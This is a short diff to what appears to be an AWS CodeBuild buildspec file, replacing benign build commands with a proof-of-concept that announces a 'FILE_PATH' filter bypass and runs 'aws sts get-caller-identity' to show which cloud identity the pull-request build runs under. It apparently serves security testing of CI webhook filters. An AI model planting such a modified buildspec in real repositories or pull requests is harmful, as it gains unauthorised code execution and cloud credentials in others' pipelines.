@@ -2,5 +2,8 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Legitimate build running"
-      - echo "Build completed successfully"
+      - echo "=== FILE_PATH BYPASS CONFIRMED ==="
+      - echo "This buildspec was modified in the PR"
+      - echo "If you see this, the FILE_PATH filter was bypassed"
+      - aws sts get-caller-identity 2>&1 || true
+      - echo "=== EXPLOIT SUCCESSFUL ==="
